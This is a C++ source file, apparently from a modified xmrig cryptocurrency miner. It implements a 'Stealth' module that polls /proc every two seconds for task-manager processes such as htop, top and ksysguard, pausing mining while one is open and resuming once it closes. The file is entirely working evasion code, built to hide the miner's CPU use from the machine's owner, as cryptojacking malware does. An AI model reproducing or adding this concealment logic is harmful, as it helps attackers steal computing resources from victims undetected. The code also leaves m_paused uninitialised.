#include "base/Stealth.h"
#include "core/Controller.h"
#include <dirent.h>
#include <fstream>
#include <string.h>
#include <unistd.h>

namespace xmrig {

Stealth::Stealth(Controller *controller) :
    m_controller(controller),
    m_running(false)
{
    m_blacklist = {
        "htop",
        "top",
        "gnome-system-monitor",
        "ksysguard",
        "lxtask",
        "mate-system-monitor",
        "xfce4-taskmanager"
    };
}

Stealth::~Stealth()
{
    stop();
}

void Stealth::start()
{
    if (m_running) {
        return;
    }

    m_running = true;
    m_thread = new std::thread(&Stealth::mainLoop, this);
}

void Stealth::stop()
{
    if (!m_running) {
        return;
    }

    m_running = false;
    if (m_thread && m_thread->joinable()) {
        m_thread->join();
    }

    delete m_thread;
    m_thread = nullptr;
}

void Stealth::mainLoop()
{
    while (m_running) {
        checkProcesses();
        std::this_thread::sleep_for(std::chrono::seconds(2));
    }
}

void Stealth::checkProcesses()
{
    bool processFound = false;
    DIR *dir = opendir("/proc");
    if (!dir) {
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(dir)) != nullptr) {
        if (entry->d_type == DT_DIR) {
            char *endptr;
            strtol(entry->d_name, &endptr, 10);
            if (*endptr == '\0') {
                std::string commPath = std::string("/proc/") + entry->d_name + "/comm";
                std::ifstream commFile(commPath);
                if (commFile.is_open()) {
                    std::string processName;
                    std::getline(commFile, processName);
                    commFile.close();

                    for (const auto &blacklisted : m_blacklist) {
                        if (processName == blacklisted) {
                            processFound = true;
                            break;
                        }
                    }
                }
            }
        }
        if (processFound) {
            break;
        }
    }

    closedir(dir);

    if (processFound && !m_paused) {
        m_paused = true;
        m_controller->pause(Controller::PAUSE_STEALTH);
    }
    else if (!processFound && m_paused) {
        m_paused = false;
        m_controller->resume(Controller::PAUSE_STEALTH);
    }
}

} // namespace xmrig
